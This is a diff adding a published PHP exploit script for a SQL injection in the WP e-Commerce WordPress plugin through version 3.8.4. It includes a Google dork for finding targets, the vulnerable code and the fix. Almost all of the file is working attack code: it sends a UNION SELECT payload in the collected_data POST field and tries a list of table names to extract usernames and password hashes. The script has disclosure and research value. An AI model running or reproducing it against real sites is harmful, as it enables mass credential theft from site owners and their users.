@@ -1,0 +1,114 @@
+# Exploit Title: WP E-commerce plugin <= 3.8.4 Sql Injection
+# Google Dork: inurl:page_id= “Your billing/contact details”
+# Date: 18/07/2011
+# Author: IHTeam
+# Software Link: http://www.getshopped.org/
+# Version: 3.8.4
+# Tested on: 3.8.4
+# Original Advisory: http://www.ihteam.net/advisory/wordpress-wp-e-commerce-plugin/
+
+<?php
+/*
+	WP e-Commerce <= 3.8.4 SQL Injection
+	Download link: http://wordpress.org/extend/plugins/wp-e-commerce/
+	Author contact: 29/06/2011
+	Exploit published: 18/07/2011
+
+	Bugged code (wpsc-theme/functions/wpsc-user_log_functions.php):
+		foreach ( (array)$_POST['collected_data'] as $value_id => $value ) {
+				$form_sql = "SELECT * FROM `" . WPSC_TABLE_CHECKOUT_FORMS . "` WHERE `id` = '$value_id' LIMIT 1";
+				$form_data = $wpdb->get_row( $form_sql, ARRAY_A );
+				
+        FIX: Upgrade to version 3.8.5
+
+ 	Bug found by: IHTeam
+	Simone `R00T_ATI` Quatrini
+	Marco `white_sheep` Rondini
+	Francesco `merlok` Morucci
+	Mauro `epicfail` Gasperini
+	For GetShopped as their security auditors
+
+ 	This code has been released under the authorization of GetShopped staff.
+ 	It will show user_login and user_pass of wp_users table;
+	
+	Google Dork: inurl:page_id= "Your billing/contact details"
+	Follow us on Twitter! @IHTeam
+*/
+function help() {
+	echo "\n";
+	echo " -------------------WP e-Commerce <= 3.8.4 SQL Injection---------------\n\n";
+	echo "	How to use: php wp-ecommerce.php host path page_id [table_name]\n\n";
+	echo "	host 		= Domain name\n";
+	echo "	path 		= Path of WordPress\n";
+	echo "	page_id		= Int value of the login page of WP e-commerce\n";
+	echo "	table_name	= Default is wp_users\n\n";
+	echo "	Example: php wp-commerce.php www.domain.com /wordpress/ 11 wp_users\n\n";
+	echo " ----------------------------------------------------------------------\n\n";
+}
+
+function exploit($host,$path,$pageid,$table) {
+        $url = $host.$path."?page_id=".$pageid."&edit_profile=true";
+        $buggy_code=urlencode("-2' UNION ALL SELECT 2, concat(user_login,':',user_pass), 'email', 1, 1, null, 1, 2, 'billingfirstname', null, 0 from ".$table." WHERE 
+'1'='1");
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL,$url);
+        curl_setopt($ch, CURLOPT_POST, 3);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"collected_data[".$buggy_code."]=&submit=Save+Profile&submitwpcheckout_profile=true");
+        $result= curl_exec ($ch);
+        curl_close ($ch);
+	
+	echo "Now using table name: $table... ";
+        
+	preg_match("/<span class=\"wpsc_error_msg_field_name\">(.*?)<\/span>.<br \/>/", $result, $matches);
+        if ( !isset($matches[1]) )
+                $msg="Wrong table name or not vulnerable\n";
+        else 
+                $msg="Credential found: ".$matches[1]."\n";	
+
+        return $msg;
+
+}
+
+if ( isset($argv[1]) && isset($argv[2]) && isset($argv[3]) ) {
+	if (isset($argv[4]))
+		$table = $argv[4];
+	else
+		$table = "wp_users";
+
+	$host = $argv[1];
+	$spos=strpos($host, "http://");
+    	if(!is_int($spos)&&($spos==0))
+		$host="http://$host";
+
+	$path = $argv[2];
+	$pageid=(int)$argv[3];
+
+	/* Detecting the version, if possible */
+	$version = file_get_contents($host.$path.'wp-content/plugins/wp-e-commerce/readme.txt');
+	preg_match("/Stable tag: (.*)/", $version, $vmatch);
+	
+	if ( !isset($vmatch[1]) )	
+		$version="Not detectable\n";
+	else
+		$version=$vmatch[1];
+	
+	echo "Version: ".$version."\n";
+	/* End of version detecting */
+	
+	
+	/* Executing exploit */
+	preg_match('/[^.]+\.[^.]+$/', $host, $hmatch);
+	$host_name=str_replace('http://','',$hmatch[0]);
+
+	$tarray = array($table, 'wordpress_users', '_users', 'users', 'wpusers','wordpressusers', $host_name.'_users', str_replace('.','',$host_name).'_users', str_replace('.','',$host_name).'users' );
+
+	foreach($tarray as $index => $val) { 
+		echo exploit($host,$path,$pageid,$val);
+	}
+	/*  End of exploit */
+} else
+	help();
